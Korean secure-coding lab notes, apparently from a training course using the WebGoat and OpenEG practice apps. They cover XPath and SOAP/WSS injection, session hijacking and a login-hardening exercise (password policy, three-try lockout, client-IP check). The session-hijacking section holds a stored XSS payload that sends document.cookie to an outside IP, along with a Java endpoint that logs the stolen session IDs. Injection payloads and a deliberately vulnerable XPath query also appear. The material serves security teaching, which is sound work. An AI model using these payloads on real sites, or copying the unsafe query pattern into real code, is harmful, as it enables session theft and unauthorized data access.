### XPath 삽입

XML 문서에 저장된 데이터를 애플리케이션에서 검색하거나 읽기 위해 사용하는 것으로 입력값을 조작해 애플리케이션 로직을 손상시키도록 쿼리를 변조하거나 권한 없이도 특정 데이터를 추출할 수 있게 된다.



TestUtil.java

동적인 쿼리

~~~java
	public String readXML(String name)  {

	 StringBuffer buffer=new StringBuffer();
     
	 try {
	   InputStream is =
			   this.getClass().getClassLoader().getResourceAsStream("config/address.xml");
       DocumentBuilderFactory builderFactory = 
    		    DocumentBuilderFactory.newInstance();
	   DocumentBuilder builder =  builderFactory.newDocumentBuilder();
	   Document xmlDocument = builder.parse(is);
	   XPath xPath =  XPathFactory.newInstance().newXPath();
	 
	   System.out.println("ccard 출력");
         //동적인 쿼리
	   String expression = "/addresses/address[@name='"+name+"']/ccard";

	   NodeList nodeList = (NodeList) xPath.compile(expression).evaluate(xmlDocument, XPathConstants.NODESET);
	   for (int i = 0; i < nodeList.getLength(); i++) {
		   buffer.append("CCARD[ "+i+ " ]  "+nodeList.item(i).getTextContent()+"<br/>");
	   }
~~~



#### SQL 구문에 영향을 줄 수 있는 문자들

', ", ;, --, #, /*, */



TestUtil.java

정적인 쿼리

~~~java
	   System.out.println("filter 전:" + name);
	   name=name.replaceAll("[()='\\[\\]:,*/]", "");
	   System.out.println("fileter 후:" + name);
	   System.out.println("ccard 출력");
	   String expression = "/addresses/address[@name='"+name+"']/ccard";
~~~



### SOAP 삽입

- XML 포맷에서 데이터를 캡슐화하는데 사용되는 메시지 기반 통신 기술

- XML은 <,>,/와 같은 메타문자를 이용해서 표현하므로 SOAP 메시지에 포함하여 공격 가능

head

~~~
POST http://70.12.113.167:8181/WebGoat/services/SoapRequest HTTP/1.0
Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*
Referer: http://192.168.111.128:8080/WebGoat/attack?Screen=39&menu=1900
Accept-Language: ko
Content-Type: text/xml
Proxy-Connection: Keep-Alive
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) Paros/3.2.13
Host: 192.168.111.128:8080
Content-length: 59
Pragma: no-cache
Cookie: JSESSIONID=984C8EF36602A2839CF3DE1B28464897; ASPSESSIONIDQQDQSSBT=OGNFNHNDNAJMCJIMABEBPLIJ; ASPSESSIONIDQQARRRDT=ABKLOKODBHHMKAPEFJDDEKOJ
Authorization: Basic Z3Vlc3Q6Z3Vlc3Q=
SOAPAction: /

~~~

body

~~~
<?xml version="1.0" encoding="UTF-8" ?>
<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
<SOAP-ENV:Body>
<ns1:getFirstName SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/" xmlns:ns1="http://lessons">
<id xsi:type="xsd:int">101</id>
</ns1:getFirstName>
</SOAP-ENV:Body>
</SOAP-ENV:Envelope>
~~~

결과값

~~~
  <?xml version="1.0" encoding="UTF-8" ?> 
- <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
- <soapenv:Body>
- <ns1:getFirstNameResponse soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/" xmlns:ns1="http://lessons">
  <getFirstNameReturn xsi:type="xsd:string">Joe</getFirstNameReturn> 
  </ns1:getFirstNameResponse>
  </soapenv:Body>
  </soapenv:Envelope>
~~~



### WSS Injection

~~~
a</password><id xsi:type='xsd:int'>199</id><password xsi:type='xsd:string'>a
~~~

~~~
<?xml version='1.0' encoding='UTF-8'?>
<wsns0:Envelope
  xmlns:xsi='http://www.w3.org/2001/XMLSchema-instance'
  xmlns:xsd='http://www.w3.org/2001/XMLSchema'
  xmlns:wsns0='http://schemas.xmlsoap.org/soap/envelope/'
  xmlns:wsns1='http://lessons.webgoat.owasp.org'>
  <wsns0:Body>
    <wsns1:changePassword>
      <id xsi:type='xsd:int'>101</id>
      <password xsi:type='xsd:string'>a</password><id xsi:type='xsd:int'>199</id><password xsi:type='xsd:string'>a</password>
    </wsns1:changePassword>
  </wsns0:Body>
</wsns0:Envelope>
~~~



### 세션 하이재킹

ASP에서 글 업로드

~~~html
<div id='img'></div><script>document.getElementById("img").innerHTML="<img src='http://70.12.113.167:8181/openeg/test/a.do?sessionid="+document.cookie+"'/>";</script>
~~~



openeg에서 로그인 한 후 ASP게시판에서 업로드 한 글 확인시에 세션이 넘어감

~~~java
	@RequestMapping(value="/test/a.do")
	@ResponseBody
	public void testSecureCookie2(HttpServletRequest request, HttpServletResponse response) {
		String clientSessionId=request.getParameter("sessionid");
		System.out.println("Hacked clientSessionId:"+clientSessionId);
		try {
			File imgFile=new File("C:\\SecureCoding\\workspace\\.metadata\\.plugins\\org.eclipse.wst.server.core\\tmp0\\wtpwebapps\\openeg\\img\\hit.png");
			FileInputStream in=new FileInputStream(imgFile);
			ByteArrayOutputStream bs=new ByteArrayOutputStream();
			byte[] buffer=new byte[1024];
			int readlength=0;
			while((readlength=in.read(buffer)) != -1){
				bs.write(buffer,0,readlength);
			}
			byte[] imgbuf=null;
			imgbuf=bs.toByteArray();
			bs.close();
			in.close();
			
			int length=imgbuf.length;
			ServletOutputStream out=response.getOutputStream();
			out.write(imgbuf,0,length);
			out.close();
		}catch(Exception e){
			e.printStackTrace();
		}
	}
~~~



### 암호정책 수립

1. config/message.properties 생성(회원가입시 안내 메세지 설정)

~~~
field.required=required Field
field.invalidPattern=invalid Pattern

~~~

2. memberValidatior.java 수정

~~~java
package kr.co.openeg.lab.member.service;

import java.util.regex.Matcher;
import java.util.regex.Pattern;

import kr.co.openeg.lab.member.model.MemberModel;

import org.springframework.validation.Errors;
import org.springframework.validation.Validator;

public class MemberValidatior implements Validator {

	@Override
	public boolean supports(Class<?> clazz) {
		return MemberModel.class.isAssignableFrom(clazz);
	}

	@Override
	public void validate(Object target, Errors errors) {
		MemberModel memberModel = (MemberModel) target;
		
		if(memberModel.getUserId() == null || memberModel.getUserId().trim().isEmpty()){
			errors.rejectValue("userId", "field.required",null,"필수 입력 항목입니다");
		}
		
		if(memberModel.getUserPw() == null || memberModel.getUserPw().trim().isEmpty()){
			errors.rejectValue("userPw", "field.required",null,"필수 입력 항목입니다");
		}else{
			if(!verify(memberModel.getUserPw())){
				errors.rejectValue("userPw", "field.invalidPattern",null,"알파벳 대소문자,숫자,특수문자 포함 8자리 이상이어야 합니다");
			}
		}
		
		if(memberModel.getUserName() == null || memberModel.getUserName().trim().isEmpty()){
			errors.rejectValue("userName", "field.required",null,"필수 입력 항목입니다");
		}

	}
	
	public boolean verify(String password){
		String passwordPolicy="((?=.*[a-zA-Z])(?=.*[0-9@#$%]).{8,})";
		Pattern p=Pattern.compile(passwordPolicy);
		Matcher m=p.matcher(password);
		return m.matches();
	}

}

~~~

3. LoginController.java 수정(인증 시도 횟수 3회 제한,30초 락,IP 확인)

~~~java
package kr.co.openeg.lab.login.controller;

import java.util.Date;

import javax.annotation.Resource;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpSession;

import kr.co.openeg.lab.login.model.LoginSessionModel;
import kr.co.openeg.lab.login.model.SecurityModel;
import kr.co.openeg.lab.login.service.LoginService;
import kr.co.openeg.lab.login.service.LoginValidator;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.context.ApplicationContext;
import org.springframework.context.support.ClassPathXmlApplicationContext;
import org.springframework.stereotype.Controller;
import org.springframework.validation.BindingResult;
import org.springframework.web.bind.annotation.ModelAttribute;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.servlet.ModelAndView;


@Controller
public class LoginController {
	 
	@Resource(name="loginService")
	private LoginService service;
	
	@RequestMapping("/login.do")
	public String login() {		
		
		return "/board/login";
	}
	
	@RequestMapping(value="/login.do", method = RequestMethod.POST)
	public ModelAndView loginProc(HttpServletRequest request,@ModelAttribute("LoginModel") LoginSessionModel loginModel, BindingResult result, HttpSession session) {
		ModelAndView mav = new ModelAndView();
		
		// form validation
		new LoginValidator().validate(loginModel, result);
		if(result.hasErrors()){
			mav.setViewName("/board/login");
			return mav;
		}
		
		String userId = loginModel.getUserId();		
		SecurityModel sec=service.checkSecurity(userId);
		
		if(sec!=null){			
			if(sec.getRetry()>=3){
				long retryTime=new Date().getTime()-sec.getLastFailedLogin();
				if(retryTime<30000){
					mav.addObject("userId",userId);
					mav.addObject("errCode",6);								
					mav.setViewName("/board/login");
					return mav;
				}else{
					sec.setRetry(0);
					sec.setLastFailedLogin(0);
					service.updateSecurity(sec);
				}
			}
		}else{			
			sec=new SecurityModel();
			sec.setUserId(userId);
			service.insertSecurity(sec);
		}
		String userPw = loginModel.getUserPw();
		LoginSessionModel loginCheckResult = service.checkUserId(userId,userPw);
		
		//check joined user
		if(loginCheckResult == null){			
			sec.setUserId(userId);
			sec.setRetry(sec.getRetry()+1);
			sec.setLastFailedLogin(new Date().getTime());			
			service.updateSecurity(sec);
			
			mav.addObject("retry",sec.getRetry());			
			mav.addObject("userId", userId);
			mav.addObject("errCode", 5);	
			mav.setViewName("/board/login");			
			return mav; 
		}else {			
			sec.setRetry(0);
			sec.setLastFailedLogin(0);
			sec.setLastSuccessedLogin(new Date().getTime());
			
			sec.setClientIp(request.getRemoteAddr());
			service.updateSecurity(sec);
			session.setAttribute("sec",sec);
			session.setAttribute("userId", userId);
			session.setAttribute("userName", loginCheckResult.getUserName());
			mav.setViewName("redirect:/board/list.do");
			return mav;
		}
		
	}
	
	@RequestMapping("/logout.do")
	public String logout(HttpSession session){
		session.invalidate();
		return "redirect:login.do";
	}
}

~~~

4. SecurityModel.java 작성(login_history 테이블에 저장될 정보)

~~~java
package kr.co.openeg.lab.login.model;

public class SecurityModel {
	private int loginFailedCount;
	private long lastFailedLogin;
	private long lastSuccessedLogin;
	private String userId,clientIp;	
	
	public SecurityModel() {		
	}	
	public SecurityModel(int loginFailedCount, long lastFailedLogin, long lastSuccessedLogin) {		
		this.loginFailedCount = loginFailedCount;
		this.lastFailedLogin = lastFailedLogin;
		this.lastSuccessedLogin = lastSuccessedLogin;		
	}	
	public int getLoginFailedCount() {		
		return loginFailedCount;
	}	
	public void setLoginFailedCount(int loginFailedCount) {		
		this.loginFailedCount = loginFailedCount;
	}	
	public long getLastFailedLogin() {		
		return lastFailedLogin;
	}	
	public void setLastFailedLogin(long lastFailedLogin) {
		this.lastFailedLogin = lastFailedLogin;		
	}	
	public long getLastSuccessedLogin() {		
		return lastSuccessedLogin;
	}	
	public void setLastSuccessedLogin(long lastSuccessedLogin) {
		this.lastSuccessedLogin = lastSuccessedLogin;		
	}
	public int getRetry() {		
		return loginFailedCount;
	}
	public void setRetry(int i) {
		loginFailedCount=i;		
	}
	public void setClientIp(String remoteAddr) {
		clientIp=remoteAddr;		
	}
	public String getClientIp() {		
		return clientIp;		
	}	
	public String getUserId() {		
		return userId;
	}	
	public void setUserId(String userId) {		
		this.userId = userId;
	}	
}

~~~

5. LoginService.java 수정(login_history 테이블에 추가될 정보 처리 메소드 추가)

~~~java
package kr.co.openeg.lab.login.service;

import javax.annotation.Resource;

import kr.co.openeg.lab.login.dao.LoginDao;
import kr.co.openeg.lab.login.model.LoginSessionModel;
import kr.co.openeg.lab.login.model.SecurityModel;

import org.springframework.orm.ibatis.SqlMapClientTemplate;
import org.springframework.stereotype.Component;
import org.springframework.stereotype.Service;

@Service
public class LoginService {
	
	@Resource(name="loginDao")
	private LoginDao dao;
	
	public LoginSessionModel checkUserId(String userId) {
		return dao.selectUserId(userId);		
	}	

	public LoginSessionModel checkUserId(String userId, String userPw) {
		return dao.selectUserId(userId, userPw);
	}

	public SecurityModel checkSecurity(String userId) {
		// TODO Auto-generated method stub
		return dao.checkSecurity(userId);
	}

	public void updateSecurity(SecurityModel sec) {
		dao.updateSecurity(sec);
	}	
	
	public void insertSecurity(SecurityModel sec) {
		dao.insertSecurity(sec);
	}
}

~~~

6. LoginDao.java 수정(login_history 테이블에 추가될 정보 처리 메소드 추가)

~~~java
package kr.co.openeg.lab.login.dao;

import kr.co.openeg.lab.login.model.LoginSessionModel;
import kr.co.openeg.lab.login.model.SecurityModel;

public interface LoginDao {
	
	LoginSessionModel selectUserId(String userId);
	LoginSessionModel selectUserId(String userId, String userPw);
	SecurityModel checkSecurity(String userId);
	void updateSecurity(SecurityModel sec);
	void insertSecurity(SecurityModel sec) ;

}

~~~

7. LoginDaoImpl.java 수정(login_history 테이블에 추가될 정보 처리 메소드 추가)

~~~java
package kr.co.openeg.lab.login.dao;

import kr.co.openeg.lab.login.dao.LoginDao;
import kr.co.openeg.lab.login.model.LoginSessionModel;
import kr.co.openeg.lab.login.model.SecurityModel;

import org.springframework.orm.ibatis.SqlMapClientTemplate;
import org.springframework.orm.ibatis.support.SqlMapClientDaoSupport;
import org.springframework.stereotype.Component;

public class LoginDaoImpl extends SqlMapClientDaoSupport implements LoginDao {

	@Override
	public LoginSessionModel selectUserId(String userId) {
		return (LoginSessionModel) getSqlMapClientTemplate().queryForObject("login.loginCheck1", userId);

	}	
	@Override
	public LoginSessionModel selectUserId(String userId, String userPw) {
		return (LoginSessionModel) getSqlMapClientTemplate().queryForObject("login.loginCheck2",                
				                          new LoginSessionModel(userId, userPw, null, false));
	}
	@Override
	public SecurityModel checkSecurity(String userId) {
		// TODO Auto-generated method stub
		return (SecurityModel) getSqlMapClientTemplate().queryForObject("login.checkSecurity",                
                userId);
	}
	@Override
	public void updateSecurity(SecurityModel sec) {
		getSqlMapClientTemplate().update("login.updateSecurity", sec);
	}	
	@Override
	public void insertSecurity(SecurityModel sec) {
		getSqlMapClientTemplate().insert("login.insertSecurity", sec);
	}	
}

~~~

8. login.xml 수정(login_history 테이블에 추가될 정보 처리 쿼리 추가)

~~~xml
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE sqlMap      
    PUBLIC "-//ibatis.apache.org//DTD SQL Map 2.0//EN"      
    "http://ibatis.apache.org/dtd/sql-map-2.dtd">
    
<sqlMap namespace="login">
	<typeAlias alias="LoginModel" type="kr.co.openeg.lab.login.model.LoginSessionModel"/>
	<typeAlias alias="SecurityModel" type="kr.co.openeg.lab.login.model.SecurityModel"/>
	
	<insert id="insertSecurity" parameterClass="SecurityModel">
		insert into login_history(userId, lastFailedLogin, lastSuccessedLogin, retry, clientIp)
		values(#userId#, #lastFailedLogin#, #lastSuccessedLogin#, #loginFailedCount#,#clientIp#)
	</insert>
	
	<update id="updateSecurity" parameterClass="SecurityModel">
		update  login_history set
		   lastFailedLogin=#lastFailedLogin#, 
		   lastSuccessedLogin=#lastSuccessedLogin#,
		   retry=#loginFailedCount#
		where 
		   userid=#userId#
	</update>	
	
	<select id="checkSecurity" parameterClass="String" resultClass="SecurityModel">
		select 
			*			
		from login_history
		where userId = #userId#
	</select>	
	
	<select id="loginCheck1" parameterClass="String" resultClass="LoginModel">
		select 
			idx,
			userId,
			userPw,
			userName,
			joinDate
		from board_member
		where userId = #userId#
	</select>	
	<select id="loginCheck2" parameterClass="LoginModel" resultClass="LoginModel">
		select 
			idx,
			userId,
			userPw,
			userName,
			joinDate
		from board_member
		where userId = #userId# and userPw = #userPw#
	</select>	
</sqlMap>
~~~

9. SessionInterceptor.java 수정(Client IP 확인)

~~~java
package kr.co.openeg.lab.common.interceptor;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;

import kr.co.openeg.lab.login.model.SecurityModel;

import org.springframework.web.servlet.ModelAndView;
import org.springframework.web.servlet.handler.HandlerInterceptorAdapter;


public class SessionInterceptor extends HandlerInterceptorAdapter{
	@Override
	public boolean preHandle(HttpServletRequest request,
		                                  HttpServletResponse response, Object handler) throws Exception {
		// check variable
		Object userId = request.getSession().getAttribute("userId");
		//
		if(request.getRequestURI().contains("/test/init_db.do") && "admin".equals(userId)) {
			 return true;
		}

		// pass through when access login.do, join.do
		
		if(request.getRequestURI().equals("/openeg/login.do") || request.getRequestURI().equals("/openeg/member/join.do")){
			if(userId != null){
				response.sendRedirect(request.getContextPath() + "/board/list.do");
				return true;
			} else {
				return true;
			}
		}
		//
		// where other pages		
		if(userId == null){
			response.sendRedirect(request.getContextPath() + "/login.do");
			HttpSession session=request.getSession();
			session.setAttribute("errCode", "4");
			return false;
		} else {
			HttpSession session=request.getSession();
			SecurityModel sec=(SecurityModel)session.getAttribute("sec");
			
			if(sec==null){				
				session.invalidate();
				response.sendRedirect(request.getContextPath() + "/login.do");
				return true;
			}
			
			if(sec.getClientIp().equals(request.getRemoteAddr())){
				return true;
			}else{
				return false;
			}
			
		}
		//		
	}
	
	@Override
	public void postHandle(HttpServletRequest request,
			HttpServletResponse response, Object handler,
			ModelAndView modelAndView) throws Exception {
	}
}

~~~

10. login.jsp 수정(30초 락 메세지 안내)

~~~jsp
<%@ page language="java" contentType="text/html; charset=UTF-8"
	pageEncoding="UTF-8"%>
<%@ taglib uri="http://www.springframework.org/tags" prefix="spring"%>
<%@ taglib uri="http://www.springframework.org/tags/form" prefix="form"%>
<%@ taglib uri="http://java.sun.com/jsp/jstl/core" prefix="c"%>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>Login</title>
<link href="<%=request.getContextPath()%>/css/main.css" rel="stylesheet"
	type="text/css">
<c:if test="${errCode == null}">
	<c:set var="errCode" value="\"\""></c:set>
</c:if>
<script type="text/javascript">
	function checkErrCode(){
		var errCode = ${errCode};		
		if(errCode != null || errCode != ""){
			switch (errCode) {
			case 1:
				alert("가입된 사용자ID가 아닙니다!");
				break;
			case 2:
				alert("비밀번호가 일치하지 않습니다!");
				break;			
			case 3:
				alert("회원가입 처리가 완료되었습니다! 로그인 해 주세요!");
				location.href = 
					"<%=request.getContextPath()%>/login.do";
				break;
			case 4:
				alert("로그인후에 사용가능합니다.");
				break;
			case 5:
				alert("login failed");
				break;
			case 6:
				alert("30초 뒤 다시 시도해 주세요");
				break;
			}
		}
	}
</script>
</head>
<body onload="checkErrCode()">
	<div id="container">

		<h1>
			<jsp:include page="header.jsp" />
		</h1>


		<div id="content-container">
			<div id="content">
              <jsp:include page="main.jsp" />
			</div>
		    <div id="aside">
				<spring:hasBindErrors name="LoginModel" />
				<form:errors path="LoginModel" />
				<form action="login.do" method="post">
					<fieldset>
						<center>
							<label for="userId">메일주소 : </label> <input type="text"
								id="userId" name="userId" class="loginInput" value="${userId}" />
							<span class="error"><form:errors path="LoginModel.userId" /></span><br />
							<label for="userPw">비밀번호 : </label> <input type="password"
								id="userPw" name="userPw" class="loginInput" /> <span
								class="error"><form:errors path="LoginModel.userPw" /></span><br />
							<br /> <input type="submit" value="로그인" class="submitBt" /> <input
								type="button" value="회원가입" class="submitBt"
								onClick='window.open("member/join.do","_blank","width=400,height=400, toolbar=no, menubar=no, scrollbars=no, resizable=no, copyhistory=no");' />
						</center>
					</fieldset>
				</form>		    </div>
			<div id="footer">
				<jsp:include page="footer.jsp" />
			</div>
		</div>
	</div>

</body>
</html>
~~~

